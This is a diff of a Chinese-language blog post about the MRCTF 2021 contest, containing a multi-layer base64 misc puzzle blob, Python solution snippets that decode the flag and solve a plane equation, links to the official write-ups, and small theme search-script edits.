mxwellrUldZVkpYVWtoWlZWVjRWMFpXY21KR1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHYTAxWFVrbFdiWFJ6VmxkS1NGVnVRbFpoYTFwTVZHMTRZV05zYTNwaFIyeE9WbXhaTUZacVNqQlpWbVJJVTJ4YVdHSkhhRmhaYkZKSFZERndWbGR1VG1wV2EzQjZXVEJrTkZVeVNsZFRiVVpZVmtWS2NsbHFSbUZTTVU1ellrWkthVll5YUZwV2JUQjRWVzFSZUZwR1pHRlNWR3h4VkZaYWQwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcDBWVmhrV0Zac2NFdGFWVnBYVjFkR1IyRkhiRmhTYTNCYVZtdGFZVmxYVVhoVWEyUllWMGQ0Y1ZWc2FGTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVVsNVVtdGtWV0Y2Vms5WmJHUnFaVVphZEUxVVVtaE5iRVkwVmxab2IxWXhaRWhsUmxaWFRVZFNkbGt3V2xaa01WcFZVbXhvVTJKWVozZFdSbHBoVkRGa1IxTnVUbFJpUjJoWVZGZHdWMk5zV2tobFJYUnJVakZLUmxaSGVHOWhSVEZYWTBoc1YyRnJTbWhWTWpGU1pWWlNjbGR0YUZOaWEwcFFWbGN3TVZFd01YTlhia1pVWW01Q2MxVnRjekZUVmxaMFpFZEdhVkpyY0RCV1Z6QTFWMnhhUms1VlVsWk5WbkJ5Vm14YVQyTldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZsUmEzQllZVEZ3VUZaSGVGcGxiVVpIWTBaa2FFMVlRakpYV0hCSFZtMVdWMU5zYkdsU2JIQndWbXRrTkZkR1pGaGxSemxwVFZaS1NGWXlOVXRYUjBwV1YyNUdWVll6VW1oVmFrWmhVMGRXUjFSc1ZtbFNia0Y0Vmxaa2QxVXhXWGhYYWxwU1lXeEtWMWxYZEdGaFJtdDVZek5vVjAxWFVubFViRnByVlRKRmVsRnNjRmROVjFGM1dWUktTbVZXVm5WVWJHaFlVakZLV2xkWGVHOVZNVnBYVm01R1VtSlZXbFZWYlRFMFpWWlplVTVYZEdoU2JIQXdWbGQwYzFkc1dsaFVWRVpYWVd0d1RGWXhXa2RqYlVaSFkwZDRhRTB3U2xGV01uaFhZVEZSZUZOdVVsTmhNbEpUV1d0a1UyTkdXblJrU0dSWFlrWnNORmRyVWxOaFZURnlZa1JPVldKR2NISldNR1JMWXpGT2NrOVdXbWhOVm5CdlYxZHdSMVV4V1hoYVNGWlZZWHBzVkZsclpETk5WbHBJWlVaYVQxWXdXa2xWTW5SaFlXeEtXRlZzWkZWV00wSklXa2Q0WVdOV1RuSmtSbEpUWWtad05WWkVSbUZXTVZsNVUydHNVbUpVYkZoWlYzUkxZMnhhU0UxV1pHdFNhM0I1VjJ0a2IxVXlSalpXYm1SWFZucENNMVJzVlRGU01XUlpZVVphYUUxRVZtaFdiWEJEVmpBMVIxZHNhRTlXYXpWWFZGZDBkMlZXVW5OWGJrNVlZa2RTU2xWWGRHOVdNREZIWTBod1YwMUhVbFJWYlRGVFUwZE9TR0pHVG1sU00xRXhWbTE0YW1WSFZuSk9WbVJYVjBkU1QxWnRNVk5qVmxaeVZtMUdXRkpzY0hoV1J6QTFWbXhLZEdWR2FGZE5ibEl6V1d0YVMyTnJOVlZTYkdob1RWaENlVmRXV21GaE1VbDRWRzVPYVZKdFVuQldhMVpLVFVaYWMxa3phRmROVld3MFdUQldjMVl5U2taT1dFSldZa2RvUkZwRVJtRmtSMVpJVW0xMFRtRXhjRWxXYWtreFZURlNjMVJyYUdoU2JWSldWbTE0Vm1WR1dYZFhiSEJzVmpGYVNWUXhaRzlVYkZwWVQwaHNXRll6VW5GVWJGcGhWakZrZFZSc2FHaGhlbFpYVm0xNFlXUXlSa2RYV0dSaFVsUnNVRmxyV25kbGJHUnlWbFJHYUZKVVJscFZWbEpIVmpKS1dWRnJlRlZXVmxWNFZXcEdhMlJXVG5KT1ZtaFRZa2hDTWxac1VrTldNbEY0V2tWa2FWSnRhSEpWYWtKaFlqRldkRTVWVGxOTlZtdzFXa1ZTUTJGRk1WWmlSRTVWWWtaYWNsWnNaRXRTTWs1SlUyeGtVMDB5YUc5V2FrSnJWVzFXZEZSclpHRlNNbmhaVldwS2IxWnNXbk5oU0dSU1lsWmFTRlpIZEd0V1IwcElaVWM1Vm1GclNtaFdhMXBoWTFaT2RFOVdaR2xTTVVwYVYydFdhMDFIUmxaTldFcHBVa1pLV0Zsc1VsZFdSbHBJWlVkR1QySlZjRWxWYlhocllWWmFSbFpZWkZkaVZFVXdWbXBLVTFKck5WZGhSM1JUWWtad2RsZHNaREJaVm1SWFdrWm9hMUpyTlZaVVZscHpUVEZTVjJGRlpGZE5hMVkyV1ZWa1IxZHNXa1pYYWs1WFVsWndNMVZ0ZUd0ak1YQklaRVprVGxORlNrdFdiR040VGtaUmVGZFlaRTVXYkhCWlZqQm9RMWRHYkhOaFJ6bFhVbXhaTWxWdGREQmhNVXB6WTBSR1YxSXphRkJaVm1SR1pVZE9SMk5HYUZkTk1VcDVWbXhTUzFReFNYaFhibFpUWWtVMWIxUldhRU5sVmxwSFYyMTBWazFYVWtoV01uaHZZVEZLUmxOc1pGVldWa3BJVmpGYVlWZEhVa2hQVm1Sb1pXdFplRmRXVm05a01XUkhWMjVPYWxKWVVtaFdhazV2VTBac05sSnNaR3BOV0VKSldWVmtiMkpIU2tkaVJGWlhZbFJHTTFWcVJuTlhSa3BaWVVkR1UxWXlhRmxYVmxKTFlqRldWMWR1VW10VFIxSldWRlphZDJWc1dsaGtSMFpWWWtWd01GWlhlR0ZXYkZvMlVtdG9WMDF1YUdoWmVrcExVbFpXYzJGSGFFNVdia0Y1VmpGYVYxbFdUWGxVV0doVlltczFXVmxyWkZOalJscHlWbTFHVjFac2NEQmFSV1JIWVRBeFdGVnJiRmRpV0ZKNlZteGtTMU5HVm5WUmJGcG9ZVEZ3VFZaSE1UUlpWMDV6WVROd2FGSXllRTlXYlhoYVRVWmFjVk5xUWxwV2JWSkpWVzAxVDJGc1NuUmhSbWhhVmtWYWFGcFdXbmRXYkdSMVZHeGtWMkV6UWpaWFZFSnJUa1pWZVZOc1pGUmlWVnBaVm10V1MyRkdaRmRhUldSWFRWZFNXbGxyWkc5Vk1rcFlZVVp3V0ZZelVuSldWekZTWlVad1IxcEdhR2xoZWxaWlZrWmtlazFXVGtkWFdHeHNVbnBzYjFadGRITk9SbFY1VGxjNVYwMVZjREJXVm1oclYwWmFjMk5GZEdGV1ZuQllWakZrUjFJeVJraGlSbWhUWVROQmVsWnRlR3RrTVVWNVZWaG9ZVk5GTlhCVmJYaDNWMVpzVlZOc1RsaFNiRXBaV2tWYWExUXhTblJrUkU1WVlUSk5NVll3V2t0ak1rNUZVV3hrVjAweWFGRldNVnBoV1ZkTmVWUnJhR2hTYmtKUFdXMHhibVZzV2xoalJXUnJUVlUxU1ZVeWRHOWhWa3B5VGxac1ZtSkdXak5XVkVaaFpFVXhTVnBIZUZOV1JscEtWbGQ0YjJJeFdYaGFSV2hvVW0xNFdGUlZaRk5rYkZweFVtNU9hbUpJUWtsVU1XUjNZVlpLYzFkWWNGZE5ibEpvVmtSR2ExSXhUblZVYkZKcFVqSm9XbGRXVWtkVE1WcEhZa2hLV0dKVlduRlVWM014VTBac2NsZHNaRmROYTNCSVdUQm9jMVl5Um5KVGJXaFdaV3R3VUZwRldrOWpiRnB6Vm0xc1UwMVZjRE5XYlhCRFZqRk5lRmRzWkZoaWExcFZXVzAxUTJNeFZuUmpla1pVVm14YU1GcEZaRWRoVmtweVkwUkNWMVl6VFRGV01qRkxWbFpLZFZkc2NHaGhNWEJ2VjFSR1lWSXlVa2RUYms1aFVsUldiMXBYZUZwTmJGbDRWV3RPVjAxcmJEUldiR2h6VmtkRmVXRkdaRnBoTWxKMlZtMTRZV1JIVmtoU2F6Vk9WbTVDV2xkc1ZtdFNNa1p5VFZaa1dHSnRlRmhWYm5CSFpHeGFTR1ZIUmxoU01Va3lWVmQ0YTFZeFNsZGpSRXBZVjBoQ1NGWnRNVmRXTVU1ellrZHNVMDF0YUZaV1YzaFhaREZrUjFwR2FHeFNlbXhXV1d4YVlWTkdiRlZVYlhSWVVqQndlVlJzV205V01rcFpWVzFvVlZac2NISlpNbmhoVmxaS2RHRkdaR2hOTUVZMFZteGFZV0l5UlhoWFdHaFVZbXMxY1ZWdGVFdFdNVnB5Vm0xR2FGSnRkRFZaZWs1dlZqQXhXRlZ1YkZWaVJuQnlWbFJLUm1Wc1JuTmpSbVJwVmtWR05GZHJVa2RYYlZaSFdraEtZVkp0YUhCWlZFWjNWbXhrVjFWck9WWk5WbkJZVm0wMVUySkdTWGRYYms1YVlURndlbFJzV25kV2JVWklaRWRvVTJKSVFYZFdiR1F3WWpGYWNrMVdhR2hTUlRWWVZGVmFkMWxXY0ZobFJXUnFZbFZhU0ZkclpHOWhSVEIzVTJ4S1YySlVSak5WYWtaV1pWWldjMXBHWkdsaGVsWlVWMWQwYTFVeVRrZFhibEpyVTBkU1dGbHJXbk5PUm1SeVZXeE9hRlpVUm5sWmExSlRWMjFGZUdOSVNsaFdiSEJNV1hwR2EyTXhVbk5qUjJ4VFlraENkbFl4WkhkU01WVjRXa1ZvVm1FeVVtaFZiRkpYVkRGYWRHUklaRmhXYkhCNFZURm9iMVJzU1hkWGEyeFdUVzVTYUZaRVJtRlhSMVpJVW14a2FWSnVRWHBYVkVvMFdWZE9WMVJ1U210U00xSllXVlJHZDA1V1dYbGtSM1JUVFZaV05GVXllR3RoYkVwSFkwWm9XbUpIYUVSVk1GcHJWakZrZEdSR2FGTmhNMEkxVmpKMGEySXhWWGxTYWxwWFltMVNXRlp1Y0VKbFJsWllZek5vYWsxWFVscFpWVnB2WVZaSmVGTnRhRmRpV0VKRVZtcEJNVkl4WkhOaFJUbFhWa2Q0V2xaWE1IaFZNVTVYWTBaYVdtVnNXbGhaYkZaWFRrWlplV05GT1ZkTlJFWklXVEJvZDFZd01VaFZiRkpXWWxSR1ZGVXdaRTlUUjBwSFZHMXNVMDB4UlhoV2JURTBZVzFSZVZacldrNVdWMUpaVmpCa1UxUXhXblJOVms1cVZteGFlVlp0TVVkWFJrcDBaVWh3V2xaWFRURldNRnBMWkVkV1IyRkdaRTVpYXpCNFZteFNTMU14U25KT1ZteHFVbTVDVDFWdE5VTmxWbHAwWTBWa1ZFMVdjREJXUjNScllWWktkRlZzYkZaTlJscE1WVEZhWVdOc1ZuSmFSbWhwVm14d1NWZFVRbGRqTVZsNVUydGFUMWRGU2xkWmExcExWMFp3UlZKdFJtdFNNVnBKVlcweE1GUnRSWGhqUld4WFlXdHJlRlpVUmxOak1YQkdZa1pLYUdWdGVGbFhWM2h2VkcxV1IxZFlaRmhpU0VKelZteFNWMWRHV2toTlZ6bFZZa1p3V1ZRd2FITlhSbGw2Vlc1R1ZXSkdjR2hXYWtaclpGWlNjMkZIYkdsaE1IQllWakZrTUZsWFVYbFdiazVZWW14S1QxWnNaRk5XUm14eVYydDBiR0pIVW5sWGEyaFBWakF4V0ZWclpGWk5ibEYzVm1wQmVGWXlUa2RoUm1Sb1lURndXRmRzVm1GaE1rMTVVbXRrVm1KWGVGUlVWRXB2VFd4YWMxVnJUbGROYkVZMFYydFdhMkZXVGtaalJteGFZbFJHVkZac1dsZGtSVFZXVkd4T1RsWnRkekZYYTFaVFVUSkdSazFXV21sU1JUVldXV3RhWVdOc1duTmFSWFJUVFdzMVNsVXllR3RWTURCNVlVYzVWMkZyU25KV1Z6RlhaRVpTY2xwSFJsTk5ibWhhVmxkd1MySXhXbk5YYms1b1UwZFNVMWxzV21GVFJscElaRWQwVjFZd2NFbGFWV2hEVm0xS1dWUllhRnBoYTFwVVZqQmtWMUp0VWtkYVIyeFRUVlZ3WVZacldtRmlNbEY0Vlc1T1dHSnJOWEZWYlRGdldWWnNWVk50T1ZaU2JIQjRWVEowTUZZeVNraFZibkJhVmxad00xbFZWWGhYVmtaWlkwWmtVMkpHY0c5WGExSkhXVmRTUjFOdVNtaFNNMUpVV1d0YWQyUnNaSE5hUkVKYVZtMVNXRmRyV2xkVmJVcFZZa2hHVlZac2NIcFVWRVpUVmpKR1JscEdXazVoTVZreFYxWldhMUl4V1hsU2JrcFBWMFp3WVZac1duZGxWbkJYVmxob1YyRjZiRmhXUjNocllVVXdkMU5VU2xkTlZuQllXVlJLU21WR1ZuVlViVVpUVm01Q1ZsZFhkRmRrTVdSSFlraE9hRkpyTlhGWmExcExaVlpaZVU1Vk9WaFNhM0I2VlRKd1IxWXhXWHBoUm1oYVZsWldORlpxU2s5U01rcEhZVVprVGsxVmNEVldiWGhUVWpGc1YxTllhRmRpYXpWWVdXdGFTMk5HV25KYVJGSnJUVlp3U0ZZeU1VZGhNREZ6VjJ4b1YwMXVhSFpaVkVaTFVteE9jMXBHVmxkV2EzQkpWbXBDWVdNeVRuTldiazVWWWtkU1QxWnNZelJsVmxwMFRWUlNVazFYVW5wV01qVlBZV3hLV1dGSFJsVldNMEpJVmxWYVYyTldUbkphUms1T1ZqRkpkMWRYZEdGVU1WSjBVMnhvYUZKWFVsaFpiRkpIVFRGV2NWSnVUbGhTYTNCYVdWVmtSMVV4V1hsaFJteFlWbXhLVEZaVVJtRmpNa3BKVTJ4a1YxSldjSGRXUmxwdlVURmtWMk5GV21GU1YxSllWVzE0ZDJWc2EzZGhSemxYWVhwR01WVlhlRk5XTWtaeVVtcFNWMkZyV21oWk1WcGhZekZrZEdKR1RrNWlWMUV5Vm0weE5HRnRWa2RVV0d4VlltdHdVRlp0TVZOaFJsWjBUbFZPYWxKc1dqQmFSV2hyVmtaYWMyTkVRbUZTVjFKSVZqQmtTMVl4WkhOaVJtUnBWMFpLTWxkV1VrZFRiVlp6VW01V1VtSkdjSEJXYTFwaFVsWmFkR05GWkZwV2JWSkhWRlphVjFadFNsaGhSVGxYWWxoU01scEVSbUZYUjFaSVQxZDBUbFpzYjNkV1ZFb3dZakpLUjFOdVVtaFNiV2hoVm10V1lXRkdjRmRYYm1SWFlrZFNNVlpITVhkV01rVjZVV3BhV0ZaRlNuSlVhMXBXWlZaT2MxcEdVbWxXVm5CYVZtMTBWMU15VG5OaVNFWlRZbFZhVkZSV1ZURmxiR3h5VjJ0MGFGWnJiRFJWTW5oM1ZqSktWVkpVUWxabGExcFVWV3BHYTJNeFduTlViV2hzWWxob1ZsWnJXbUZaVjFGM1RWWmtWMkpzU25OVmJGSnpZakZhZEUxV1RsUlNiRlkxVkd4b1QxWXdNWEpqUmxwV1lrWktSRlp0TVZkamJVNUhZVVp3YkdFelFrMVdWM0JIWVRKU1IxTnVUbFppUlRWWVZXMTRkbVZXV25STlNHUnNVbFJXU1ZaV2FITldNa3BJVlcwNVZWWkZjRlJXTVZwelpFVXhWMVJzYUZOaVJYQmFWMnRXYjJFeFdrZFhiazVxVWxkNFlWUlZXbmRWUmxweFVteHdhMDFXY0hoV2JYaHJWakF3ZVdGR1JsZE5WbkJvVjFaa1RtVldVbkpoUjJoVFltdEtVRmRYTUhoaWJWWnpWMnhvYWxKWFVuSlVWbFV4VTFaVmVXUkhPV2hXYTNCNVZHeGFjMVp0U2tkWGFrNVhWa1ZhYUZwRlZYaFRWbkJJWlVaT1YxSnNjRXRXYkdRMFlqSkplRmRZYUdGU1YyaHZWV3BLYjFZeGJISmFSazVYVW14d2VGVnROVTloYlVwSVZXcEdXR0V4Y0hKV1IzaGFaVzFHUjFwR1pGZFNWemgzVm10U1MxSXlUbkpOVm1SaFVqTkNWRlZzVm5kaU1WcDBaVWRHV0dKV1JqUlphMmhMV1ZaS1dWVnNVbFZXTTAxNFZXMTRWMWRIVmtkYVJtUk9WbTVDTlZkVVFtRmpNVmw1VTJ4c1VtRXdOV2hXYkZwM1ZFWmFjVkpyT1d0V2JFb3dWVzE0VDJGWFJYZGpSRTVYVFZkT05GUlZXazVsUmxaeldrWm9hV0pGY0ZCV1ZFSnJZakZhVjFWc1pHRlNhelZaVlcxNGQwMUdVbk5YYlhSWVVtdHNNMWt3Vm5OV01WbzJVVlJHVjAxdWFHaFZiWGhyWTFaU2MyTkhhR2hOV0VKMlZtMXdRMVp0VmtkWGJHUlhZbXhLYjFWc1VsZGlNWEJZWlVaa1RrMVdjREJVVldodlZHeEpkMVpxVWxwaE1YQnlWbXRhYTFOSFZraFBWbHBwWW10S05sWnRNVFJaVjA1elYyNUthMUpzV2xSWmEyaERWMnhrYzFadGRGTk5hMXA1VkZaYWIyRXhTa2RqUjBaWFlrWndWMVJXV21GV1ZrNXlaRVpvVjAxR2NFbFhWRUpoWVRKR1JrMVdiRkpoYTNCWlZtcE9RMVJHVm5GVGF6VnNVbXhLTVZaSE1XOVZNREYwWVVaYVYxWXphRmhhUkVaclVqRndSMkZIZUZObGJYaFhWMWQ0WVZsV1RrZFhXR3hyVW0xU1YxUlhkSGRXTVZsNVRsVmtWMVpzY0RCV1YzaFRXVlpaZW1GSWJHRlNSVm96Vld4YVYyUkhSa2RhUjJoT1RVVlpNRlp0ZUdGWlYwbDVVbGhvWVZKWGFGVlpWRXBUVjFac2RHUklaRmROVjNoWldrVmtSMkZHU25Sa1JGWmFaV3MxZGxacVFYaFhSbFp4VVd4d2FFMVlRbEZXYkZKTFVtMVdjMUp1VWxCV2JWSlBWbTAxUTFaV1dsaGpSWFJXWWxaYVdGWlhOVmRXVjBwSVlVWnNWbUZyV2t4WmFrWmhWMGRXU0U5V1drNWhlbFpaVjFkMGIxUXhXWGhYYTFwWVlrWktWbFp0ZUhkVFJsSnlWMnh3YkZaVVJsWlZWekZ2VlRKS1NWRllaRmRpUjFGM1dYcEdhMU5HU25WVGF6bFhVbFJXV1ZkV1pEQmtNVTVIWVROc2JGSlViSEpWYWtKaFUwWnJkMXBFVW1oU1ZFWmFWVmR3VjFZeVNsbFJhMUpZVm14d1YxcFdXbE5rVmxKMFkwWk9WMDF0YUZaV01XUXdWbXN4V0ZSclpGaGliRXB5VlRCa1UxZEdiSEpYYms1UFVtMVNlVlpYZEU5WFIwcEhZa1JTVm1KWVFsQldiR1JMVWpKT1NWTnNaRTVTTVVwTlYxaHdSMVF5VG5KUFZtUmhVakpvVDFadE5VTlViRnB4VW0xR1dsWnRlRmxXVjNSdlZqSkZlR05IYUZaaVJrcDZWbXRhYzJOdFJrWlRiWFJPVmpGS05sWnRNSGhTTWtaR1RWWmthbEp0ZUZkVVZ6VlRZVVpzV0dWRmRGaFNNVnBKVlcxNFYxWXhTbFZXYTFaWVlrWndhRlpxUmtwbFJrNXpWbTFzVTJFeGNGaFdiWFJUVVdzMVVsQlVNRDA9aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>把最后的 <code>a</code> 给去掉，然后不停解 base64。</p>
 <p>貌似套了22层 base64，就离谱。</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210418000625265.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210418000625265.png" alt=""></p>
 <p><code>MRCTF{bUt_Y0u_c@n_f1yyyyyyyy~}</code></p>
 <blockquote>
 <p>BTW, 官方 WP 这个移位加置位的方式写起来挺方便的。</p>
@@ -966,7 +965,6 @@ im2 <span class="token operator">=</span> Image<span class="token punctuation">.
                 ch <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k
         flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
 flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>另外来抄一下 <a target="_blank" rel="noopener" href="http://snowywar.top/wordpress/index.php/2021/04/11/mrctf2021-plane-wp/">snowywar 师傅求空间平面方程的解法</a>。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
 
@@ -989,20 +987,18 @@ mark <span class="token operator">=</span> <span class="token punctuation">[</sp
 res <span class="token operator">=</span> <span class="token string">""</span>
 a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d <span class="token operator">=</span> define_area<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>于是可以得到空间平面方程 <code>Ax+By+Cz+D=0</code> 的系数。</p>
 </blockquote>
 <br>
-
 <hr>
 <br>
-
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>太顶了太顶了！</p>
+<h2 id="小结">小结</h2>
+<p>太顶了太顶了！</p>
 <p>北邮的师傅们太强了 Orz。</p>
 <p>BTW，师傅们自己开发的这个 CTFm 平台还不错，只是可能还比较新的原因还有点小 bug，不过问题不大，慢慢来嘛。</p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230721513.png"></p>
-<p><del>比如 profile 页面这里的名字貌似只是前端做了限制，后端并没有限制来着（虽然图片上没有体现</del></p>
-<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230826508.png"></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230721513.png" alt=""></p>
+<p><s>比如 profile 页面这里的名字貌似只是前端做了限制，后端并没有限制来着（虽然图片上没有体现</s></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230826508.png" alt=""></p>
 <p><em>（比赛的时候就做了两题 + 问卷 check out，然后 rk45，就离谱</em></p>
 <blockquote>
 <p>噢，<strong>官方 WriteUp</strong> 也出来了（</p>
@@ -1011,7 +1007,7 @@ a<span class="token punctuation">,</span>b<span class="token punctuation">,</spa
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237898">MRCTF2021 CRYPTO官方wp</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237797">MRCTF2021 官方ETH&amp;IOT方向Wp</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237897">MRCTF2021 官方PWN方向Wp</a></p>
-<p><del>（怎么 web 还没有呢</del> 终于有了</p>
+<p><s>（怎么 web 还没有呢</s> 终于有了</p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237917">MRCTF2021 Web方向Wp</a></p>
 </blockquote>
 <p>就这样吧。累死了。</p>
@@ -1666,7 +1662,7 @@ def unknownf2889ac4(addr _param1) payable:
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">308.6k</span>&nbsp;字
+                class="white-color">308.3k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
@@ -1807,11 +1803,12 @@ $(function () {
                         var data_title = data.title.trim().toLowerCase();
                         var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                         var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                         var index_title = -1;
                         var index_content = -1;
                         var first_occur = -1;
                         // only match artiles with not empty titles and contents
-                        if (data_title != '' && data_content != '') {
+                        if (data_title !== '' && data_content !== '') {
                             keywords.forEach(function (keyword, i) {
                                 index_title = data_title.indexOf(keyword);
                                 index_content = data_content.indexOf(keyword);
@@ -1821,7 +1818,7 @@ $(function () {
                                     if (index_content < 0) {
                                         index_content = 0;
                                     }
-                                    if (i == 0) {
+                                    if (i === 0) {
                                         first_occur = index_content;
                                     }
                                 }
@@ -1852,12 +1849,12 @@ $(function () {
                         }
                     });
                     str += "</ul>";
-                    str = "<p class=\"search-result-summary\">共找到" + String(cnt-1) + "条结果</p>"  + str;
+                    str = "<p class=\"search-result-summary\">共找到 " + String(cnt-1) + " 条结果</p>"  + str;
                     $resultContent.innerHTML = str;
                 });
             }
         });
-    }
+    };
 
     searchFunc('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/search.xml', 'searchInput', 'searchResult');
 });
